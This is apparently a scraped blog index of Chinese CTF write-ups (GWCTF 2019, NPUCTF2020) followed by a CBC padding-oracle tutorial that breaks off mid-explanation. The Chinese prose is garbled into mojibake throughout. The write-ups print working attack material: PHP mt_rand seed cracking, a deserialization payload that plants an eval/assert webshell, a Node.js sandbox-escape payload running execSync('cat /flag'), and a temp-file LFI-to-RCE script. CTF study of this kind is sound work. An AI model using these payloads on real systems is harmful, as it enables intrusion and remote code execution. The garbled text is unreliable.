mt_rand().\u0026quot;\u0026lt;br/\u0026gt;\u0026quot;;\recho mt_rand().\u0026quot;\u0026lt;br/\u0026gt;\u0026quot;;\r?\u0026gt;\ræˆ‘ä»¬å†æ¬¡è®¿é—®:\n162946439\r247161732\r1463094264\r1878061366\r394962642\rç°åœ¨ç»†å¿ƒçš„äººå¯èƒ½å·²ç»å‘ç°ï¼Œç¬¬ä¸€ä¸ªæ•° 162946439 å­˜åœ¨çŒ«è…»äº†ã€‚\nä¸ºä»€ä¹ˆç”Ÿæˆéšæœºæ•°ä¼šä¸€æ ·å‘¢ï¼Ÿæˆ‘ä»¬å¤šæ¬¡è®¿é—®ã€‚éœ‡æƒŠ: è¿˜æ˜¯\n162946439\r247161732\r1463094264\r1878061366\r394962642\rå…¶å®ï¼Œè¿™å°±æ˜¯ä¼ªéšæœºæ•°çš„æ¼æ´ï¼Œå­˜åœ¨å¯é¢„æµ‹æ€§ã€‚\nç”Ÿæˆä¼ªéšæœºæ•°æ˜¯çº¿æ€§çš„ï¼Œä½ å¯ä»¥ç†è§£ä¸º y=ax , x å°±æ˜¯ç§å­ï¼ŒçŸ¥é“ç§å­å’Œä¸€ç»„ä¼ªéšæœºæ•°ä¸æ˜¯å°±å¯ä»¥æ¨y(ä¼ªéšæœºæ•°)äº†å— å½“ç„¶ï¼Œå®é™…ä¸Šæ›´å¤æ‚è‚¯å®šã€‚\næˆ‘çŸ¥é“ç§å­åï¼Œå¯ä»¥ç¡®å®šä½ è¾“å‡ºä¼ªéšæœºæ•°çš„åºåˆ—ã€‚ çŸ¥é“ä½ çš„éšæœºæ•°åºåˆ—ï¼Œå¯ä»¥ç¡®å®šä½ çš„ç§å­ã€‚\nç”¨åˆ°çš„æ˜¯çˆ†ç ´ï¼Œå·²ç»æœ‰å†™å¥½çš„Cè„šæœ¬äº†ã€‚\næˆ‘ä»¬çš„æ€è·¯å°±æ˜¯æ ¹æ®ä»–ç»™å‡ºçš„10ä¸ºæ•°æ®ï¼Œæ¥çˆ†ç ´ä»–çš„éšæœºæ•°ç§å­ï¼Œç„¶ååœ¨æŠŠå‰©ä¸‹çš„éšæœºæ•°è¾“å‡º\nå› ä¸ºæ˜¯ç”¨çš„php_mt_seedï¼Œæˆ‘ä»¬è¦ç”¨ä»–çš„æ ¼å¼ï¼Œè¿™æ˜¯è½¬æ¢æˆéšæœºæ•°çš„è„šæœ¬\n\u0026lt;?php\r$pass_now = \u0026quot;JAfq968Gqy\u0026quot;;//ç»™å‡ºçš„å¯†é’¥\r$allowable_characters = '\rabcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';//å­—æ¯è¡¨\r$length = strlen($allowable_characters) - 1;\rfor ($j = 0; $j \u0026lt; strlen($pass_now); $j++) {//éå†å¯†é’¥\rfor ($i = 0; $i \u0026lt; $length; $i++) {//éå†å­—æ¯è¡¨\rif ($pass_now[$j] == $allowable_characters[$i]) {\recho \u0026quot;$i $i 0 $length \u0026quot;;\rbreak;\r}\r}\r}\r?\u0026gt;\rè¿è¡Œï¼Œå¾—åˆ°\n45 45 0 61 36 36 0 61 5 5 0 61 16 16 0 61 35 35 0 61 32 32 0 61 34 34 0 61 42 42 0 61 16 16 0 61 24 24 0 61\ræŠŠphp_mt_seedä¸‹è½½è§£å‹ä¹‹åï¼Œè¿è¡Œå‘½ä»¤ï¼š\nmake\r./php_mt_seed 45 45 0 61 36 36 0 61 5 5 0 61 16 16 0 61 35 35 0 61 32 32 0 61 34 34 0 61 42 42 0 61 16 16 0 61 24 24 0 61\rå¯ä»¥å¾—åˆ°ä»–çš„éšæœºæ•°ç§å­\nç„¶åæˆ‘ä»¬ç›´æ¥æŠŠä»–åŸæ¥çš„ä»£ç æ‹·è´è¿‡æ¥ï¼Œç§å­æ›¿æ¢ä¸ºæˆ‘ä»¬çˆ†ç ´å‡ºæ¥çš„ï¼š\n\u0026lt;?php\rmt_srand(591614089);\r$str_long1 = \u0026quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026quot;;\r$str='';\r$len1=20;\rfor ( $i = 0; $i \u0026lt; $len1; $i++ ){\r$str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); }\r$str_show = substr($str, 0, 20);\recho $str_show;\r?\u0026gt;\rè¿è¡Œå¾—åˆ°ä¸€ä¸²å­—ç¬¦ JAfq968GqyhRKQTHLc8j ï¼Œå¼€å¤´æ°å·§å°±æ˜¯ä»–ç»™çš„ï¼Œæäº¤è·å¾—flag\nflag{37c86593-2593-4566-b3cd-18081cbe44d0}\n","date":"2020-04-30T00:00:00Z","permalink":"https://anthem-whisper.github.io/p/gwctf-2019-%E5%A4%8D%E7%8E%B0/","title":"GWCTF 2019 å¤ç°"},{"content":"æŸ¥æºç  F12ï¼Œctrl+Uï¼Œæ²¡å•¥å¥½è¯´çš„\nRealEzPHP æ‰“å¼€æ˜¯ä¸ªé»‘é¡µï¼ŒæŸ¥çœ‹æºç å‘ç°äº† ./time.php?source è®¿é—®ä¹‹ï¼š\n \u0026lt;?php\r#error_reporting(0);\rclass HelloPhp\r{\rpublic $a;\rpublic $b;\rpublic function __construct(){\r$this-\u0026gt;a = \u0026quot;Y-m-d h:i:s\u0026quot;;\r$this-\u0026gt;b = \u0026quot;date\u0026quot;;\r}\rpublic function __destruct(){\r$a = $this-\u0026gt;a;\r$b = $this-\u0026gt;b;\recho $b($a);\r}\r}\r$c = new HelloPhp;\rif(isset($_GET['source']))\r{\rhighlight_file(__FILE__);\rdie(0);\r}\r@$ppp = unserialize($_GET[\u0026quot;data\u0026quot;]);\r2020-04-21 07:53:29\rå¾ˆç®€å•çš„ä¸€ä¸ªååºåˆ—åŒ–ï¼Œ\n\u0026lt;?php\r#error_reporting(0);\rclass HelloPhp\r{\rpublic $a = '1';//æ›´æ”¹ä¸º2ï¼Œ3ï¼Œ4ï¼Œ5èƒ½è¯»å–æ›´å¤šä¿¡æ¯\rpublic $b = 'phpinfo';\r/*\rpublic function __destruct(){\r$a = $this-\u0026gt;a;\r$b = $this-\u0026gt;b;\recho $b($a);\r}\r*/\r}\r$pop = new HelloPhp;\recho serialize($pop);\rç›´æ¥ ?data=O:8:\u0026quot;HelloPhp\u0026quot;:2:{s:1:\u0026quot;a\u0026quot;;s:1:\u0026quot;1\u0026quot;;s:1:\u0026quot;b\u0026quot;;s:7:\u0026quot;phpinfo\u0026quot;;} å°±èƒ½çœ‹åˆ°phpinfoé¡µé¢ï¼›\nå¥½ï¼Œå†™åé—¨ï¼š\n\u0026lt;?php\r#error_reporting(0);\rclass HelloPhp\r{\rpublic $a = 'eval($_POST[\\'wh1sper\\']);';\rpublic $b = 'assert';\r/*\rpublic function __destruct(){\r$a = $this-\u0026gt;a;\r$b = $this-\u0026gt;b;\recho $b($a);\r}\r*/\r}\r$pop = new HelloPhp;\recho serialize($pop);\rO:8:\u0026ldquo;HelloPhp\u0026rdquo;:2:{s:1:\u0026ldquo;a\u0026rdquo;;s:24:\u0026ldquo;eval($_POST[\u0026lsquo;wh1sper\u0026rsquo;]);\u0026quot;;s:1:\u0026ldquo;b\u0026rdquo;;s:6:\u0026ldquo;assert\u0026rdquo;;}\nèšå‰‘è®¿é—® ?data=O:8:\u0026quot;HelloPhp\u0026quot;:2:{s:1:\u0026quot;a\u0026quot;;s:24:\u0026quot;eval($_POST['wh1sper']);\u0026quot;;s:1:\u0026quot;b\u0026quot;;s:6:\u0026quot;assert\u0026quot;;} å¯†ç wh1sperå°±èƒ½æ‹¿åˆ°shellï¼Œä¸è¿‡åœ¨phpinfoé‡Œé¢å¯ä»¥çœ‹åˆ°ç¦ç”¨äº†å¾ˆå¤šå‡½æ•°ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨èšå‰‘çš„æ’ä»¶ç»•è¿‡ï¼š\nç›´æ¥ç¾æ»‹æ»‹ï¼›\nä¸è¿‡æ ¹ç›®å½•æ˜¯å‡flagï¼Œflagå°±åœ¨phpinfoé¡µé¢ã€‚ã€‚ã€‚ã€‚ã€‚\nflag{6b8ca41f-d409-4d39-b62f-5243d2f0d64b}\næˆ‘è¿˜å»æ¢æµ‹å†…ç½‘ï¼ŒçœŸçš„æå¿ƒæ€ã€‚ã€‚ã€‚\nwebğŸ• è€ƒå¯Ÿå¯†ç å­¦ï¼Œè¯¦è§æœ¬ç«™ï¼šPadding Oracle Attack\u0026amp;CBCå­—èŠ‚ç¿»è½¬æ”»å‡»\néªŒè¯ğŸ å‚è€ƒï¼šhttps://guokeya.github.io/post/XxOKeal9U/\nè€ƒç‚¹ï¼šJSå¼±ç±»å‹è½¬æ¢ï¼ŒJSåŸå‹é“¾\næºç ï¼š\nconst express = require('express');\rconst bodyParser = require('body-parser');\rconst cookieSession = require('cookie-session');\rconst fs = require('fs');\rconst crypto = require('crypto');\rconst keys = require('./key.js').keys;\rfunction md5(s) {\rreturn crypto.createHash('md5')\r.update(s)\r.digest('hex');\r}\rfunction saferEval(str) {\rif (str.replace(/(?:Math(?:\\.\\w+)?)|[()+\\-*/\u0026amp;|^%\u0026lt;\u0026gt;=,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| /g, '')) {\rreturn null;\r}\rreturn eval(str);\r} // 2020.4/WORKER1 æ·¦ï¼Œä¸Šæ¬¡çš„åº“å¤ªåƒåœ¾ï¼Œæˆ‘è‡ªå·±å†™äº†ä¸€ä¸ª\rconst template = fs.readFileSync('./index.html').toString();\rfunction render(results) {\rreturn template.replace('{{results}}', results.join('\u0026lt;br/\u0026gt;'));\r}\rconst app = express();\rapp.use(bodyParser.urlencoded({ extended: false }));\rapp.use(bodyParser.json());\rapp.use(cookieSession({\rname: 'PHPSESSION', // 2020.3/WORKER2 å˜¿å˜¿ï¼Œç»™çˆªâ‘§\rkeys\r}));\rObject.freeze(Object);\rObject.freeze(Math);\rapp.post('/', function (req, res) {\rlet result = '';\rconst results = req.session.results || [];\rconst { e, first, second } = req.body;\rif (first \u0026amp;\u0026amp; second \u0026amp;\u0026amp; first.length === second.length \u0026amp;\u0026amp; first!==second \u0026amp;\u0026amp; md5(first+keys[0]) === md5(second+keys[0])) {\rif (req.body.e) {\rtry {\rresult = saferEval(req.body.e) || 'Wrong Wrong Wrong!!!';\r} catch (e) {\rconsole.log(e);\rresult = 'Wrong Wrong Wrong!!!';\r}\rresults.unshift(`${req.body.e}=${result}`);\r}\r} else {\rresults.unshift('Not verified!');\r}\rif (results.length \u0026gt; 13) {\rresults.pop();\r}\rreq.session.results = results;\rres.send(render(req.session.results));\r});\r// 2019.10/WORKER1 è€æ¿å¨˜è¯´å¥¹è¦çœ‹åˆ°æˆ‘ä»¬çš„æºä»£ç ï¼Œç”¨è¡Œæ•°è®¡ç®—KPI\rapp.get('/source', function (req, res) {\rres.set('Content-Type', 'text/javascript;charset=utf-8');\rres.send(fs.readFileSync('./index.js'));\r});\rapp.get('/', function (req, res) {\rres.set('Content-Type', 'text/html;charset=utf-8');\rreq.session.admin = req.session.admin || 0;\rres.send(render(req.session.results = req.session.results || []))\r});\rapp.listen(80, '0.0.0.0', () =\u0026gt; {\rconsole.log('Start listening')\r});\rç¬¬ä¸€å±‚45è¡Œï¼Œfirst \u0026amp;\u0026amp; second \u0026amp;\u0026amp; first.length === second.length \u0026amp;\u0026amp; first!==second \u0026amp;\u0026amp; md5(first+keys[0]) === md5(second+keys[0])è¦æ±‚firstå’Œsecondé•¿åº¦ç›¸åŒï¼Œå€¼ä¸åŒï¼Œç„¶åç»è¿‡åŠ ç›ä¹‹åå€¼å®Œå…¨ç›¸åŒï¼Œä¸€èˆ¬è¿™ç§çœ‹åˆ°å°±çŸ¥é“æ˜¯å¼±ç±»å‹ï¼Œåœ¨susecctfä¸Šé¢é‡è§è¿‡ï¼Œç›æ˜¯å­—ç¬¦ä¸²ï¼Œå½“æ‹¼æ¥çš„æ—¶å€™ï¼Œfirstå’Œsecondéƒ½ä¼šè¢«è½¬åŒ–ä¸ºå­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä¼ å…¥\nfirst='1' second=[1]\rä½†æ˜¯urlencodeæ²¡åŠæ³•ä¼ é€’æ•°ç»„ï¼Œç¬¬31è¡Œæ°å·§æç¤ºäº†å¯ä»¥æ¥å—jsonå½¢å¼çš„æ•°æ®ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä¼ å…¥jsonï¼š\nContent-Type: application/json\r{\u0026quot;e\u0026quot;:\u0026quot;1+1\u0026quot;,\u0026quot;first\u0026quot;:\u0026quot;1\u0026quot;,\u0026quot;second\u0026quot;:[1]}\ræˆ‘ä»¬å¯ä»¥çœ‹åˆ°1+1è¢«æ‰§è¡Œäº†ï¼›\nç¬¬äºŒå±‚ï¼Œ17è¡Œï¼Œ if (str.replace(/(?:Math(?:\\.\\w+)?)|[()+\\-*/\u0026amp;|^%\u0026lt;\u0026gt;=,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| /g, '')) è¿™å¥è¯æ„æ€å¤§æ¦‚æ˜¯ï¼Œeçš„å€¼åªèƒ½ æ˜¯ Math.xxxxx ã€‚ç¬¦å·åªèƒ½å‡ºç° ()+\\-*\u0026amp;|%^\u0026lt;\u0026gt;=,?: ã€‚\nç”±äº=\u0026gt;çš„å­˜åœ¨ï¼Œæˆ‘ä»¬å¾—ä»¥ä½¿ç”¨JSçš„ç®­å¤´å‡½æ•°ï¼Œå¤§æ¦‚æ˜¯è¿™ä¸ªæ„æ€ï¼š\nx =\u0026gt; x*x\rç­‰ä»·äº\rfunction (x){\rreturn x*x;\r}\ræˆ‘ä»¬å¯¹ç…§ç€playloadä¸€æ­¥æ­¥çœ‹ï¼š\n(Math=\u0026gt;\r(Math=Math.constructor,\rMath.x=Math.constructor(\rMath.fromCharCode(114,101,116,117,114,110,32,112,114,111,\r99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,\r46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,\r95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,\r121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()\r)\r)(Math+1)\ræœ€å¤–å±‚çš„æ˜¯\n(Math=\u0026gt;(xxxxx)())(Math+1)\ræœ€å¤–é¢çš„å°æ‹¬å·æ˜¯JSç«‹å³æ‰§è¡Œçš„å‡½æ•°ï¼Œå¦åˆ™ä½ å°±åªæ˜¯å•å•å®šä¹‰äº†function (Math){}è¿™ä¸ªå‡½æ•°ã€‚\nå¼€å¤´çš„Mathæ˜¯å‡½æ•°æ¥å—çš„å‚æ•°ä¹Ÿå°±æ˜¯å½¢å‚ï¼Œxxxxxæ˜¯å‡½æ•°ä½“ï¼Œ(Math+1)æ˜¯å®é™…ä¼ å…¥çš„å‚æ•°\næ¥ä¸‹æ¥æˆ‘ä»¬çœ‹ä»–çš„å‡½æ•°ä½“xxxxxå¹²äº†äº›ä»€ä¹ˆï¼›\nä¸¾ä¸ªä¾‹å­ï¼š\nMath=Math.constructor,Math=Math.constructor(Math.fromCharCode(97,108,101,114,116,40,49,41))\rå¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œå®šä¹‰äº†Mathï¼ŒæŠŠä¼ å…¥çš„Mathçš„constructorå±æ€§èµ‹å€¼\nå…·ä½“æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿè¿™é‡Œæ˜¯åˆ©ç”¨äº†JSçš„åŸå‹é“¾ï¼š\n ä¸€å¼€å§‹Mathå¹¶æ²¡æœ‰å®šä¹‰ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥ä¼ å…¥Matchï¼Œé‚£ä¹ˆä¼šæ˜¯objectï¼Œè€Œpayloadä¸­ä¼ å…¥çš„æ˜¯Math+1ï¼Œæ­¤æ—¶ç±»å‹å°±å˜æˆäº†object1ã€‚objectå¯¹è±¡å’Œå­—ç¬¦ä¸²è¿›è¡Œæ‹¼æ¥ã€‚é‚£ä¹ˆä¼šè½¬æ¢ä¸ºstringç±»å‹ ä¸ºäº†æ¸…æ¥šï¼Œæˆ‘ä»¬é‡å†™ä¸‹ä»£ç ï¼š  test=Math.constructor //ä¼ å…¥çš„Mathæ˜¯stringï¼Œè¿”å›stringç±»å‹çš„åŸå‹ï¼ŒString[function String()]\rtest2=test.constructor //è¿”å›stringåŸå‹çš„åŸå‹ï¼ŒFunction[funciton Function]\r ä¹Ÿå°±æ˜¯é€šè¿‡ä¸€ä¸ª object1 ä»åŸå‹é“¾ä¸Šè·å–äº†Stringå’ŒFunctionä¸¤ç§ç±»å‹  å›åˆ°é¢˜ç›®ï¼Œ\n#fromCharCodeå‡½æ•°å¿…é¡»æ˜¯åœ¨Stringç±»å‹ä¸Šç”¨ï¼Œä¹Ÿå°±æ˜¯String.fromCharCode()\rMath=Math.constructor\r#å®šä¹‰äº†stringç±»å‹\rMath=Math.construtor\r#å®šä¹‰äº†functionç±»å‹\rMath.constructor,Math=Math.constructor(Math.fromCharCode(97,108,101,114,116,40,49,41))()\rç­‰åŒäº\rfunction(string.fromCharCode(xxxxxxxxx)()\rexpä¸­fromCharCodeé‡Œé¢è§£ç æ˜¯ï¼š\nreturn process.mainModule.require('child_process').execSync('cat /flag').toString()\rç›¸å½“äºæˆ‘ä»¬æ‰§è¡Œäº†ï¼š\nfunction(\rreturn process.mainModule.require('child_process').execSync('cat /flag').toString()\r)()\rflag{7683e76d-e61e-4b5a-bca0-3ad38bfa27a0}\nezinclude è€ƒç‚¹ï¼šMD5å“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»ï¼ˆç–‘ä¼¼ï¼‰ã€PHP7åˆ©ç”¨php SegfaultåŒ…å«ä¿å­˜çš„ä¸´æ—¶æ–‡ä»¶\næ‰“å¼€é¢˜ç›®ï¼Œæºä»£ç é‡Œé¢æœ‰æç¤ºï¼š\u0026lt;!--md5($secret.$name)===$pass --\u0026gt; ç–‘ä¼¼MD5å“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»ï¼Œä¸è¿‡åœ¨å“åº”åŒ…é‡Œé¢ç»™å‡ºå•¦passçš„å€¼ï¼Œå¯èƒ½æ˜¯å‡ºé¢˜å‡ºç¿»è½¦äº†\nå¾—åˆ°äº† flflflflag.php ï¼Œè®¿é—®é‡å®šå‘åˆ°äº†å…¶ä»–é¡µé¢ï¼ŒæŠ“åŒ…æŠ“å›æ¥ï¼Œé¡µé¢æç¤º include($_GET[\u0026quot;file\u0026quot;]) ï¼Œæ‰«ç›®å½•å¯ä»¥å¾—åˆ° dir.php ,åŒ…å«ä»–å¯ä»¥çœ‹åˆ°è¿™ä¸ªé¡µé¢åˆ—å‡ºäº† /tmp ä¸‹çš„æ‰€æœ‰æ–‡ä»¶\nè¿™é‡Œè€ƒå¯Ÿçš„æ˜¯PHPä¸´æ—¶æ–‡ä»¶åŒ…å«ï¼Œå…¶åŸºæœ¬æ˜¯ä¸¤ç§æƒ…å†µï¼š\n åˆ©ç”¨èƒ½è®¿é—®çš„phpinfoé¡µé¢ï¼Œå¯¹å…¶ä¸€æ¬¡å‘é€å¤§é‡æ•°æ®é€ æˆä¸´æ—¶æ–‡ä»¶æ²¡æœ‰åŠæ—¶è¢«åˆ é™¤ PHPç‰ˆæœ¬\u0026lt;7.2ï¼Œåˆ©ç”¨phpå´©æºƒç•™ä¸‹ä¸´æ—¶æ–‡ä»¶  è´´ä¸€ç¯‡ï¼š\u0026raquo;LFIroRCEæ€»ç»“\n\u0026raquo;æ–‡ä»¶åŒ…å«\u0026amp;å¥‡æŠ€æ·«å·§\nè¿™é‡Œå°±ä¸ç´¯è¿°äº†ï¼Œç›´æ¥ä¸Šè„šæœ¬ï¼š\nimport requests\rfrom io import BytesIO\rpayload = \u0026quot;\u0026lt;?php phpinfo()?\u0026gt;\u0026quot;\rfile_data = {\r'file': BytesIO(payload.encode())\r}\rurl = \u0026quot;http://35869f0e-43e6-47db-a026-b77fdfed3fea.node3.buuoj.cn/flflflflag.php?\u0026quot;\\\r+\u0026quot;file=php://filter/string.strip_tags/resource=/etc/passwd\u0026quot;\rr = requests.post(url=url, files=file_data, allow_redirects=False)\rç„¶åè®¿é—® dir.php å¯ä»¥å¾—åˆ°ä¸´æ—¶æ–‡ä»¶çš„åç§°ï¼ŒåŒ…å«ä¹‹å³å¯RCE\nflagå°±åœ¨phpinfoé¡µé¢\nflag{2ac28208-c35f-426b-bca5-4f50a77e1203}\n","date":"2020-04-21T00:00:00Z","permalink":"https://anthem-whisper.github.io/p/npuctf2020_wp/","title":"NPUCTF2020_wp"},{"content":"å‰è¨€ åœ¨è¥¿å·¥å¤§ä¸¾åŠçš„NPUCTF2020ä¸Šé¢åšåˆ°ä¸€é“webcryptoçš„é¢˜ï¼Œä»¥å‰ä»æ¥æ²¡æ¥è§¦è¿‡å¯†ç å®‰å…¨æ–¹å‘ï¼Œè¿™æ¬¡æ­£å¥½å­¦ä¸€ä¸‹å…¥ä¸ªé—¨\næ­£æ–‡ å‚è€ƒ\nPadding Oracle Attackï¼š\nã€Šç™½å¸½å­è®²webå®‰å…¨ã€‹P239\n\u0026raquo;ä¸€å¶é£˜é›¶å¸ˆå‚…\nCBCç¿»è½¬æ”»å‡»ï¼š\n\u0026raquo;æŸå¸ˆå‚…\n\u0026raquo;æŸæŸå¸ˆå‚…\nå…ˆæ¥è®²ä¸€è®²CBCæ¨¡å¼åŠ å¯†åŸç†ï¼š\n é¦–å…ˆå°†æ˜æ–‡ï¼ˆPlaintextï¼‰åˆ†ç»„(å¸¸è§çš„ä»¥16æˆ–8å­—èŠ‚ä¸ºä¸€ç»„)ï¼Œä½æ•°ä¸è¶³çš„ä½¿ç”¨ç‰¹æ®Šå­—ç¬¦å¡«å……ã€‚ ç”Ÿæˆä¸€ä¸ªéšæœºçš„åˆå§‹åŒ–å‘é‡(IV)å’Œä¸€ä¸ªå¯†é’¥ã€‚ å°†IVå’Œç¬¬ä¸€ç»„æ˜æ–‡å¼‚æˆ–ï¼ˆxorè¿ç®—ï¼‰ã€‚ ç”¨å¯†é’¥å¯¹3ä¸­xoråäº§ç”Ÿçš„å¯†æ–‡åŠ å¯†ã€‚ ç”¨4ä¸­äº§ç”Ÿçš„å¯†æ–‡å¯¹ç¬¬äºŒç»„æ˜æ–‡è¿›è¡Œxoræ“ä½œã€‚ ç”¨å¯†é’¥å¯¹5ä¸­äº§ç”Ÿçš„å¯†æ–‡åŠ å¯†ã€‚ é‡å¤4-7ï¼Œåˆ°æœ€åä¸€ç»„æ˜æ–‡ã€‚ å°†IVå’ŒåŠ å¯†åçš„å¯†æ–‡æ‹¼æ¥åœ¨ä¸€èµ·ï¼Œå¾—åˆ°æœ€ç»ˆçš„å¯†æ–‡  è§£å¯†è¿‡ç¨‹ï¼š\n å…ˆä»å¯†æ–‡ä¸­å–å‡ºIVï¼Œç„¶åå¯¹å‰©ä¸‹çš„å¯†æ–‡åˆ†ç»„ï¼ˆ16æˆ–8å­—èŠ‚ä¸ºä¸€ç»„ï¼‰ ä½¿ç”¨ç§˜é’¥è§£å¯†ç¬¬ä¸€ç»„å¯†æ–‡ï¼Œå°†è§£å¯†ç»“æœä¸IVåšå¼‚æˆ–è¿ç®—ï¼Œå¾—åˆ°æ˜æ–‡1 ç„¶åä½¿ç”¨ç§˜é’¥è§£ç¬¬äºŒç»„å¯†æ–‡ï¼Œå°†è§£å¯†çš„ç»“æœä¸ä¸Šä¸€ç»„å¯†æ–‡è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œå¾—å‡ºæ˜æ–‡2 é‡å¤2-3ï¼Œç›´è‡³æ‰€æœ‰å¯†æ–‡è§£å¯†å®Œæ¯•  ä»¥ä¸Šå°±æ˜¯CBCæ¨¡å¼çš„åŠ å¯†è§£å¯†è¿‡ç¨‹ï¼Œæ¥ä¸‹æ¥è®²ä¸¤ç§æ‰‹æ®µï¼š\nPadding Oracle Attack ç›´è¯‘ä¸º â€œå¡«å……Oracleæ”»å‡»â€ ï¼Œè¿™é‡Œä¸»è¦å…³æ³¨ä¸€ä¸‹è§£å¯†è¿‡ç¨‹ï¼š\nå¯†æ–‡cipheré¦–å…ˆè¿›è¡Œä¸€ç³»åˆ—å¤„ç†ï¼Œå¦‚å›¾ä¸­çš„Block Cipher Decryption æˆ‘ä»¬å°†å¤„ç†åçš„å€¼ç§°ä¸º middle ä¸­é—´å€¼ ç„¶å middle ä¸æˆ‘ä»¬è¾“å…¥çš„ivè¿›è¡Œå¼‚æˆ–æ“ä½œ å¾—åˆ°çš„å³ä¸ºæ˜æ–‡ ä½†è¿™é‡Œæœ‰ä¸€ä¸ªè§„åˆ™å«åšPaddingå¡«å……ï¼š å› ä¸ºåŠ å¯†æ˜¯æŒ‰ç…§16ä½ä¸€ç»„åˆ†ç»„è¿›è¡Œçš„ è€Œå¦‚æœä¸è¶³16ä½ï¼Œå°±éœ€è¦è¿›è¡Œå¡«å……\næœ‰å‡ ä¸ªç©ºï¼Œå°±è¦å¡«å……å‡ ä¸ªâ€œå‡ â€\næ¯”å¦‚æ˜æ–‡ä¸ºadminï¼Œé‚£ä¹ˆéœ€è¦å¡«å……çš„å°±æ˜¯ admin\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b ï¼ˆ11ä¸ª\\x0bï¼‰\nå¦‚æœæˆ‘ä»¬è¾“å…¥ä¸€ä¸ªé”™è¯¯çš„ivï¼Œä¾æ—§æ˜¯å¯ä»¥è§£å¯†çš„ï¼Œä½†æ˜¯ middle å’Œæˆ‘ä»¬è¾“å…¥çš„ivç»è¿‡å¼‚æˆ–åå¾—åˆ°çš„å¡«å……å€¼å¯èƒ½å‡ºç°é”™è¯¯\næ¯”å¦‚æœ¬æ¥åº”è¯¥æ˜¯ admin\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b è€Œæˆ‘ä»¬é”™è¯¯çš„å¾—åˆ° admin\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x3b\\x2c\nè¿™æ ·è§£å¯†ç¨‹åºå¾€å¾€ä¼šæŠ›å‡ºå¼‚å¸¸(Padding Error)\nåº”ç”¨åœ¨webé‡Œçš„æ—¶å€™ï¼Œå¾€å¾€æ˜¯302æˆ–æ˜¯500æŠ¥é”™ è€Œæ­£å¸¸è§£å¯†çš„æ—¶å€™æ˜¯200 æ‰€ä»¥è¿™æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®æœåŠ¡å™¨çš„ååº”æ¥åˆ¤æ–­æˆ‘ä»¬è¾“å…¥çš„iv\nçœ‹ä¾‹å­ï¼š\næˆ‘ä»¬å‡è®¾middleä¸­é—´å€¼ä¸ºï¼š\n0x39 0x73 0x23 0x22 0x07 0x6a 0x26 0x3d\ræ­£ç¡®çš„è§£å¯†ivåº”è¯¥ä¸º\n0x6d 0x36 0x70 0x76 0x03 0x6e 0x22 0x39\rè§£å¯†åæ­£ç¡®çš„æ˜æ–‡ä¸ºï¼š\nT E S T 0x04 0x04 0x04 0x04\rä½†æ˜¯å…³é”®ç‚¹åœ¨äºï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“ivçš„å€¼ï¼Œå´ä¸èƒ½å¾—åˆ°ä¸­é—´å€¼å’Œè§£å¯†åæ˜æ–‡çš„å€¼ è€Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯åªæ ¹æ®æˆ‘ä»¬è¾“å…¥çš„ivå€¼å’ŒæœåŠ¡å™¨çš„çŠ¶æ€å»åˆ¤æ–­å‡ºè§£å¯†åæ˜æ–‡çš„å€¼ è¿™é‡Œçš„æ”»å‡»å³å«åš Padding Oracle Attack æ”»å‡» è¿™æ—¶å€™æˆ‘ä»¬é€‰æ‹©è¿›è¡Œçˆ†ç ´æ”»å‡»\nå¦‚æœæˆ‘ä»¬æ„é€ ä¸€ä¸ªivä¸ºï¼š\n0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00\ré‚£ä¹ˆ middle çš„å€¼å’Œè¿™ä¸ªivå¼‚æˆ–å°†ä¼šå¾—åˆ°åŸå°ä¸åŠ¨çš„ middle çš„å€¼\n0x39 0x73 0x23 0x22 0x07 0x6a 0x26 0x3d\rç°åœ¨è¿™ä¸ªè§£å¯†ç»“æœæ˜¯ä¸å¯¹çš„\næ­£ç¡®çš„ padding å€¼åªå¯èƒ½æ˜¯ï¼š\n 1ä¸ªå­—èŠ‚çš„paddingä¸º0x01 2ä¸ªå­—èŠ‚çš„paddingä¸º0x02ï¼Œ0x02 3ä¸ªå­—èŠ‚çš„paddingä¸º0x03ï¼Œ0x03ï¼Œ0x03 4ä¸ªå­—èŠ‚çš„paddingä¸º0x04ï¼Œ0x04ï¼Œ0x04ï¼Œ0x04 â€¦â€¦  å› æ­¤æˆ‘ä»¬å¸Œæœ›æ…¢æ…¢è°ƒæ•´ivçš„å€¼ï¼Œå¹¶ä¸”å¸Œæœ›è§£å¯†åæœ€åä¸€ä¸ªå€¼ä¸ºæ­£ç¡®çš„ padding æ¯”å¦‚ä¸€ä¸ª0x01ï¼Œæˆ‘ä»¬äºæ˜¯éå†æœ€åä¸€ä½ivï¼š\né‚£ä¹ˆæœ€åä¸€ä½ä¸­é—´å¯†æ–‡å°±æ˜¯ï¼š 0x01^0x3C=0x3D ï¼ˆè¿™ä¸ªä¸€å®šæˆç«‹ï¼Œçœ‹å›¾ï¼‰,åŸæ¥çš„æ˜æ–‡å°±æ˜¯ 